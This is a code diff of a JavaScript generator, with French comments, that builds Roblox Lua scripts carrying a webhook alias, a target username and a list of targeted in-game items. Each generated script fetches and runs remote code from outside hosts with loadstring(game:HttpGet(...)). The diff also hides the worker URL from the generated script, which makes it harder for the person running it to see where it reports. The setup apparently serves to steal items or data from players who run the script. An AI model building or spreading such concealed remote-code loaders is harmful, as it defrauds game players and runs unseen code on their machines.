@@ -994,6 +994,7 @@ async function generate() {
 
   const alias = generateAlias();
 
+  // Sauvegarde de l'alias dans Cloudflare KV
   try {
     const response = await fetch(`${KV_WORKER_URL}/store`, {
       method: 'POST',
@@ -1010,6 +1011,7 @@ async function generate() {
 
   const names = [...selected];
   const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
+
   let adminScriptPart = '';
   if (adminMode === 'admin-panel') {
     adminScriptPart = `task.spawn(function() loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))() end)`;
@@ -1017,15 +1019,15 @@ async function generate() {
     adminScriptPart = customAdminLoadstring;
   }
 
-  const script = `getgenv().WEBHOOK_URL = "${alias}";
-if #getgenv().WEBHOOK_URL < 20 then
-  getgenv().WEBHOOK_URL = game:HttpGet("${KV_WORKER_URL}/resolve/" .. getgenv().WEBHOOK_URL)
-end
-getgenv().TARGET_USERNAME = "${username}";
+  // Script simplifié (sans URL du worker visible)
+  const script = `getgenv().WEBHOOK_URL = "${alias}"
+getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
-};
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab71c35bd4b18d7c1ac52f950759f423c35b348cca80a7ae9724c0abe49/download"))();
+}
+
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab71c35bd4b18d7c1ac52f950759f423c35b348cca80a7ae9724c0abe49/download"))()
+
 ${adminScriptPart}
 `;
 
